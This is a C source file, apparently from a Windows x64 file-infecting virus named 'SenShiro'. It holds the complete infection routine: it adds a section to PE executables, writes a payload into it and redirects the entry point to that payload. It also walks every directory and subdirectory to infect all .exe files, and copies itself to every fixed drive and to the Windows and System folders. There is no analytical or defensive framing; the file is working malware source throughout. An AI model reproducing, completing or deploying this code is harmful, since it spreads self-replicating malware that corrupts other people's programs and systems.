#include "SenShiro.h"


void AppendFile(char *Exe2Infect, DWORD SpawnFileSize, BYTE *l_payload, LONG l_SizeRawVir, DWORD l_OffsetVirEP, 
				STR_CHARS lstr_chars, API_LOADED l_apis){

char buffer[MAX_PATH];
LPTSTR lpbuf = buffer;

HANDLE hSpawn;

void *vFileInMemory;
BYTE *ptNewHeader;

WORD NbSectionsInSpawn;

DWORD NbBytes, SpawnEP, L_SizeCode, N_SizeCode, L_RVA, L_Size, L_Raw, N_Raw, N_RVA, NewEntryPoint, NewSizeImg,
	NewSpawnFileSize, dw_imgimp, dwFileImageImport, CounterDLL, AddressofCodeStart, Counter, AddrofFakeSectionTable,
	AddrofBoundImpDir;

QWORD l_OldEP;

BOOL bResult;

PIMAGE_DOS_HEADER SpawnDOSStub;
PIMAGE_NT_HEADERS64 SpawnPEheader;
PIMAGE_FILE_HEADER ImgFileSpHdr;
PIMAGE_SECTION_HEADER ImgSectionHdr, FakeSectionHdr;
PIMAGE_OPTIONAL_HEADER64 OptPEheader;
PIMAGE_IMPORT_DESCRIPTOR ImgImpDes;


	//Debug
	//return;

	hSpawn = l_apis.fnCreateFile(Exe2Infect, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, (LPSECURITY_ATTRIBUTES)0, OPEN_ALWAYS, 
		FILE_FLAG_SEQUENTIAL_SCAN, 0);
	if (hSpawn == INVALID_HANDLE_VALUE)return;

	vFileInMemory = l_apis.fnVirtualAlloc(NULL, (SIZE_T)SpawnFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(vFileInMemory == NULL){l_apis.fnCloseHandle(hSpawn);return;}

	bResult = l_apis.fnReadFile(hSpawn, vFileInMemory, SpawnFileSize, (LPDWORD)&NbBytes, NULL);
	if (bResult == 0)return;

	SpawnDOSStub = (PIMAGE_DOS_HEADER)vFileInMemory;
	if(SpawnDOSStub->e_magic != IMAGE_DOS_SIGNATURE)goto ExitTheFunction;

	SpawnPEheader = (PIMAGE_NT_HEADERS64)((QWORD)SpawnDOSStub + SpawnDOSStub->e_lfanew);
	if(SpawnPEheader->Signature != IMAGE_NT_SIGNATURE)goto ExitTheFunction;

	//Check if the file has already been infected, if yes go back to main
	l_apis.fnmemset(lpbuf, 0, MAX_PATH);
	l_apis.fnSetFilePointer(hSpawn, -LENGTH_OF_SIGNATURE, (PLONG)NULL, FILE_END);
	l_apis.fnReadFile(hSpawn, lpbuf, LENGTH_OF_SIGNATURE, (LPDWORD)&NbBytes, NULL);
	if (!CheckIfSameString(lpbuf, lstr_chars.SIGNATURE)){goto ExitTheFunction;}

	l_apis.fnSetFilePointer(hSpawn, 0, NULL, FILE_BEGIN);

	ImgFileSpHdr = (PIMAGE_FILE_HEADER)&SpawnPEheader->FileHeader;

	OptPEheader = (PIMAGE_OPTIONAL_HEADER64)&SpawnPEheader->OptionalHeader;

	//Check if we deal with x64, if no skip
	if (OptPEheader->Magic != 0x20b){goto ExitTheFunction;}

	SpawnEP = OptPEheader->AddressOfEntryPoint;

	NbSectionsInSpawn = ImgFileSpHdr->NumberOfSections;

	//Check if we deal with a .NET file, if yes skip
	dw_imgimp = OptPEheader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if (dw_imgimp == 0)goto SkipNetCheck;
	dwFileImageImport = Virtual2Offset(SpawnPEheader, dw_imgimp);

	CounterDLL = 0;
	while (1){

		ImgImpDes = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)vFileInMemory + dwFileImageImport + 
			(DWORD)(CounterDLL*sizeof(IMAGE_IMPORT_DESCRIPTOR)));

		if (ImgImpDes->Name == 0)break;

		l_apis.fnmemset(lpbuf, 0, MAX_PATH);
		l_apis.fnlstrcpy(lpbuf, (LPTSTR)((DWORD)vFileInMemory + Virtual2Offset(SpawnPEheader, ImgImpDes->Name)));
		if (!CheckIfSameString(lpbuf, lstr_chars.DOTNET)){
			goto ExitTheFunction;}
		CounterDLL++;
	}

SkipNetCheck:

	//First update the size of code
	L_SizeCode = OptPEheader->SizeOfCode;
	N_SizeCode = L_SizeCode + l_SizeRawVir;
	OptPEheader->SizeOfCode = N_SizeCode;

	//First go the first section, we need some info
	ImgSectionHdr = (PIMAGE_SECTION_HEADER)((QWORD)SpawnPEheader + sizeof(IMAGE_NT_HEADERS64));
	AddressofCodeStart = ImgSectionHdr->Misc.PhysicalAddress;

	//Then to the last section
	ImgSectionHdr = (PIMAGE_SECTION_HEADER)((QWORD)SpawnPEheader + sizeof(IMAGE_NT_HEADERS64) + 
		(NbSectionsInSpawn-1)*sizeof(IMAGE_SECTION_HEADER));

	//Retrieve properties of the last section
	L_RVA = ImgSectionHdr->VirtualAddress;
	L_Size = ImgSectionHdr->SizeOfRawData;
	L_Raw = ImgSectionHdr->PointerToRawData;
	N_Raw = L_Raw + L_Size;

	//Align the Raw address on 0x1000 base
	if (N_Raw % 0x1000 != 0){N_Raw = (N_Raw/0x1000)*0x1000 + 0x1000;}

	if (ImgSectionHdr->Misc.VirtualSize != 0){
		N_RVA = L_RVA + ImgSectionHdr->Misc.VirtualSize;}
	else N_RVA = L_RVA + 0x1000;

	//Get the original Entry point
	l_OldEP = OptPEheader->AddressOfEntryPoint;
	
	//Align the RVA on 0x1000 base
	if (N_RVA % 0x1000 != 0){N_RVA = (N_RVA/0x1000)*0x1000 + 0x1000;}
	NewEntryPoint = l_OffsetVirEP + N_RVA;
	
	//Update the Entry Point to point to the vir
	OptPEheader->AddressOfEntryPoint = NewEntryPoint;

	//Increase number of sections
	ImgFileSpHdr->NumberOfSections = NbSectionsInSpawn + 1;

	//Append new header
	ZeroMemory(&(LPVOID)FakeSectionHdr, sizeof(IMAGE_SECTION_HEADER));
	FakeSectionHdr = (PIMAGE_SECTION_HEADER)((QWORD)SpawnPEheader + sizeof(IMAGE_NT_HEADERS64) + 
		NbSectionsInSpawn*sizeof(IMAGE_SECTION_HEADER));

	//In principle we have to skip the exe if there is not enough room for an additional header.
	//But in cases when the exe are bound there is still a possibility. We try the following.

	AddrofFakeSectionTable = (DWORD)FakeSectionHdr - (DWORD)vFileInMemory;
	
	AddrofBoundImpDir = OptPEheader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress;
	
	//If they are equal it means after the last section table header is located the bound import directory.
	//We delete everything the exe will still work!
	if (AddrofFakeSectionTable == AddrofBoundImpDir){
		OptPEheader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
	}

	else {
	//Check if there is enough room for an additional header, if not skip
		ptNewHeader = (BYTE *)FakeSectionHdr;
		for (Counter = 0; Counter < 0x28; Counter++){
			if (ptNewHeader[Counter] != 0)goto ExitTheFunction;
			Counter++;
		}
	}

	l_apis.fnlstrcpy((LPTSTR)FakeSectionHdr->Name, lstr_chars.FAKE);
	FakeSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
	FakeSectionHdr->Misc.VirtualSize = l_SizeRawVir;
	FakeSectionHdr->PointerToRawData = N_Raw;
	FakeSectionHdr->SizeOfRawData = l_SizeRawVir;
	FakeSectionHdr->VirtualAddress = N_RVA;
	FakeSectionHdr->PointerToRelocations = 0;
	FakeSectionHdr->NumberOfRelocations = 0;
	FakeSectionHdr->NumberOfLinenumbers = 0;
	FakeSectionHdr->PointerToLinenumbers = 0;

	//Update the image size based on 0x1000 alignment
	NewSizeImg = N_RVA + l_SizeRawVir;
	if (NewSizeImg % 0x1000 != 0){
		NewSizeImg = (NewSizeImg/0x1000)*0x1000+0x1000;}
	OptPEheader->SizeOfImage = NewSizeImg;

	//Save the old entry point into optional header.
	OptPEheader->Win32VersionValue = l_OldEP;

	l_apis.fnSetFilePointer(hSpawn, 0, NULL, FILE_BEGIN);
	if (l_apis.fnWriteFile(hSpawn, vFileInMemory, SpawnFileSize, (LPDWORD)&NbBytes, NULL) == 0){goto ExitTheFunction;}

	//Add some space for the extra section
	l_apis.fnSetFilePointer(hSpawn, 0x2800, (PLONG)NULL, FILE_END);
	l_apis.fnSetEndOfFile(hSpawn);

	l_apis.fnSetFilePointer(hSpawn, N_Raw, (PLONG)NULL, FILE_BEGIN);

	l_apis.fnWriteFile(hSpawn, l_payload, l_SizeRawVir, (LPDWORD)&NbBytes,NULL);

	//Put signature
	l_apis.fnSetFilePointer(hSpawn, -LENGTH_OF_SIGNATURE, (PLONG)NULL, FILE_END);
	l_apis.fnWriteFile(hSpawn, lstr_chars.SIGNATURE, LENGTH_OF_SIGNATURE, (LPDWORD)&NbBytes,NULL);



ExitTheFunction:

	l_apis.fnVirtualFree(vFileInMemory, sizeof(vFileInMemory), MEM_DECOMMIT);
	l_apis.fnCloseHandle(hSpawn);



return;
}
void InfectExeInDir(char *l_Dir2Infect, BYTE *payload, LONG SizeRawVir, DWORD OffsetVirEP, STR_CHARS lstr_chars, 
					API_LOADED l_apis){
char buffer[MAX_PATH];
LPTSTR lpbuf = buffer;
HANDLE FirstExeFound;
WIN32_FIND_DATA w_struct_FindData;
DWORD l_SpawnFileSize;


	l_apis.fnmemset(lpbuf, 0, MAX_PATH);
	l_apis.fnlstrcpy(lpbuf, (char *)l_Dir2Infect);
	l_apis.fnlstrcat(lpbuf, lstr_chars.BSLASH);
	l_apis.fnlstrcat(lpbuf, lstr_chars.STRING_EXE);

	FirstExeFound = l_apis.fnFindFirstFile(lpbuf, &w_struct_FindData);
	if (FirstExeFound == INVALID_HANDLE_VALUE){return;}
	l_apis.fnmemset(lpbuf, 0, MAX_PATH);
	l_apis.fnlstrcpy(lpbuf, l_Dir2Infect);
	l_apis.fnlstrcat(lpbuf, lstr_chars.BSLASH);
	l_apis.fnlstrcat(lpbuf, w_struct_FindData.cFileName);
	l_SpawnFileSize = (w_struct_FindData.nFileSizeHigh)*(MAXDWORD+1) + w_struct_FindData.nFileSizeLow;

	l_apis.fnMessageBox(NULL, lpbuf, lpbuf, MB_OK);
	AppendFile(lpbuf, l_SpawnFileSize, payload, SizeRawVir, OffsetVirEP, lstr_chars, l_apis);


	while(l_apis.fnFindNextFile(FirstExeFound, &w_struct_FindData) != 0){

		l_apis.fnmemset(lpbuf, 0, MAX_PATH);
		l_apis.fnlstrcpy(lpbuf, l_Dir2Infect);
		l_apis.fnlstrcat(lpbuf, lstr_chars.BSLASH);
		l_apis.fnlstrcat(lpbuf, w_struct_FindData.cFileName);
		l_SpawnFileSize = (w_struct_FindData.nFileSizeHigh)*(MAXDWORD+1) + w_struct_FindData.nFileSizeLow;

		l_apis.fnMessageBox(NULL, lpbuf, lpbuf, MB_OK);
		AppendFile(lpbuf, l_SpawnFileSize, payload, SizeRawVir, OffsetVirEP, lstr_chars, l_apis);

	}

return;
}
void InfectDirAndSubDir(char *l_Dir2Infect, BYTE *payload, LONG SizeRawVir, DWORD OffsetVirEP, STR_CHARS lstr_chars, 
						API_LOADED l_apis){

HANDLE FirstDirFound;
WIN32_FIND_DATA w_dir_struct_FindData;
char buffer[MAX_PATH], buffer2[MAX_PATH];
LPTSTR lpbuf = buffer;
LPTSTR lDir = buffer2;

	l_apis.fnmemset(lpbuf, 0, MAX_PATH);
	l_apis.fnmemset(lDir, 0, MAX_PATH);
	l_apis.fnlstrcpy(lpbuf, l_Dir2Infect);
	l_apis.fnlstrcpy(lDir, l_Dir2Infect);
	l_apis.fnlstrcat(lpbuf, lstr_chars.BSLASH);
	l_apis.fnlstrcat(lDir, lstr_chars.BSLASH);
	l_apis.fnlstrcat(lpbuf, lstr_chars.STAR);

	FirstDirFound = l_apis.fnFindFirstFile(lpbuf, &w_dir_struct_FindData);
	if (FirstDirFound == INVALID_HANDLE_VALUE){return;}
	if (w_dir_struct_FindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY){
		if (CheckIfSameString(w_dir_struct_FindData.cFileName, lstr_chars.DOTDOT) == 1 && 
			CheckIfSameString(w_dir_struct_FindData.cFileName, lstr_chars.DOT) == 1){

			l_apis.fnmemset(lpbuf, 0, MAX_PATH);
			l_apis.fnlstrcpy(lpbuf, lDir);
			l_apis.fnlstrcat(lpbuf, w_dir_struct_FindData.cFileName);

			InfectExeInDir(lpbuf, payload, SizeRawVir, OffsetVirEP, lstr_chars, l_apis);
			InfectDirAndSubDir(lpbuf, payload, SizeRawVir, OffsetVirEP, lstr_chars, l_apis);
		}
	}
	while(l_apis.fnFindNextFile(FirstDirFound, &w_dir_struct_FindData) != 0){
		if (w_dir_struct_FindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY){
			if (CheckIfSameString(w_dir_struct_FindData.cFileName, lstr_chars.DOTDOT) == 1 && 
			CheckIfSameString(w_dir_struct_FindData.cFileName, lstr_chars.DOT) == 1){

				l_apis.fnmemset(lpbuf, 0, MAX_PATH);
				l_apis.fnlstrcpy(lpbuf, lDir);
				l_apis.fnlstrcat(lpbuf, w_dir_struct_FindData.cFileName);

				InfectExeInDir(lpbuf, payload, SizeRawVir, OffsetVirEP, lstr_chars, l_apis);
				InfectDirAndSubDir(lpbuf, payload, SizeRawVir, OffsetVirEP, lstr_chars, l_apis);
			}
		}
	}

return;
}

void FindInfectAllDrives(char *l_CurrentProcess, STR_CHARS lstr_chars, API_LOADED l_apis){

char buffer[1024], buffer2[1024], buffer3[1024], c_path[MAX_PATH];
LPTSTR lpbuf = buffer;
LPTSTR bufferdrives = buffer2;
LPTSTR workingDir = buffer3;
LPTSTR lppath = c_path;
DWORD d_NbofDrives;
int i, j;

	d_NbofDrives = l_apis.fnGetLogicalDriveStrings(1024, lpbuf);

	l_apis.fnmemset(bufferdrives, 0, 1024);
	j = 0;
	for (i = 0; i < d_NbofDrives; i++){
		bufferdrives[j] = lpbuf[i];
		j++;
		if (bufferdrives[j-1] == 0){
			if (l_apis.fnGetDriveType(bufferdrives) == DRIVE_FIXED){
				l_apis.fnmemset(workingDir, 0, 1024);
				l_apis.fnlstrcpy(workingDir, bufferdrives);
				l_apis.fnlstrcat(bufferdrives, l_CurrentProcess);
				l_apis.fnCopyFile(l_CurrentProcess, bufferdrives, TRUE);
				//Execute the newly created process
				//l_apis.fnShellExecute(NULL, "open", bufferdrives, NULL, workingDir, SW_SHOW);
			}
			j=0;
			l_apis.fnmemset(bufferdrives, 0, 1024);
		}
	}
	
	//l_apis.fnMessageBox(NULL, l_CurrentProcess, l_CurrentProcess, MB_OK);

	l_apis.fnmemset(lppath, 0, MAX_PATH);
	l_apis.fnGetWindowsDirectoryA(lppath, MAX_PATH);
	l_apis.fnmemset(workingDir, 0, 1024);
	l_apis.fnlstrcpy(workingDir, lppath);
	l_apis.fnlstrcat(lppath, lstr_chars.BSLASH);
	l_apis.fnlstrcat(lppath, l_CurrentProcess);
	if (l_apis.fnCopyFile(l_CurrentProcess, lppath, TRUE) != 0){
		//Execute the newly created process
		//l_apis.fnShellExecute(NULL, "open", lppath, NULL, workingDir, SW_SHOW);
	}
	l_apis.fnMessageBox(NULL, lppath, lppath, MB_OK);

	l_apis.fnmemset(lppath, 0, MAX_PATH);
	l_apis.fnGetSystemDirectory(lppath, MAX_PATH);
	l_apis.fnmemset(workingDir, 0, 1024);
	l_apis.fnlstrcpy(workingDir, lppath);
	l_apis.fnlstrcat(lppath, lstr_chars.BSLASH);
	l_apis.fnlstrcat(lppath, l_CurrentProcess);
	if (l_apis.fnCopyFile(l_CurrentProcess, lppath, TRUE) != 0){
		//Execute the newly created process
		//l_apis.fnShellExecute(NULL, "open", lppath, NULL, workingDir, SW_SHOW);
	}
	l_apis.fnMessageBox(NULL, lppath, lppath, MB_OK);


return;
}